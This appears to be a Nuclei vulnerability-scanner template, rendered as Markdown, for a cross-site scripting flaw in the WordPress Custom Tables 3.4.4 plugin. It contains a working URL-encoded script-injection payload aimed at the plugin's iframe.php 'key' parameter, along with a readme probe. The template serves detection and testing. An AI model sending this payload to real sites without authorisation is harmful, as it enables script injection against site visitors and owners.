# Nuclei Template: WordPress Custom Tables 3.4.4 - Cross-Site Scripting
**Template ID:** wp-custom-tables-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-custom-tables-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Custom Tables 3.4.4 plugin contains a cross-site scripting vulnerability via the key parameter.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/custom-tables/readme.txt HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/custom-tables/iframe.php?s=1&key=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://wpscan.com/vulnerability/211a4286-4747-4b62-acc3-fd9a57b06252
- https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-custom-tables-key-parameter-cross-site-scripting-3-4-4/
